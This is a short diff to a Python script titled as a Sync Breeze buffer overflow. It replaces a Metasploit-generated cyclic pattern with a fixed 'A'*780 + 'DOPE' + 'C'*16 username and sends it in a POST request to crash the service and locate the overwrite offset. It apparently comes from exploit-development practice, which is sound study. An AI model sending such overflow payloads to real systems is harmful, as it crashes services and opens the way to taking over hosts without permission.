@@ -4,7 +4,6 @@
 
 import requests
 import argparse
-import subprocess
 
 # Script arguments
 parser = argparse.ArgumentParser(description='Sync breeze buffer overflow')
@@ -24,17 +23,15 @@ headers = {
 }
 
 print(f"starting overflow on {url}")
-shresult = subprocess.run(["msf-pattern_create", "-l", "800"], capture_output=True)
-if shresult.returncode == 0:
-    username = shresult.stdout.decode()[:-1]
-    data = {
-        "username": username,
-        "password": "something"
-    }
-    try:
-        response = requests.post(url, data=data, headers=headers, timeout=10)
-        print("received response, overflow failed")
-    except requests.exceptions.ReadTimeout:
-        print("request timed out")
-else:
-    print("failed to retrieve overflow pattern")
+
+username = 'A' * 780 + 'DOPE' + 'C' * 16
+
+data = {
+    "username": username,
+    "password": "something"
+}
+try:
+    response = requests.post(url, data=data, headers=headers, timeout=10)
+    print("received response, overflow failed")
+except requests.exceptions.ReadTimeout:
+    print("request timed out")
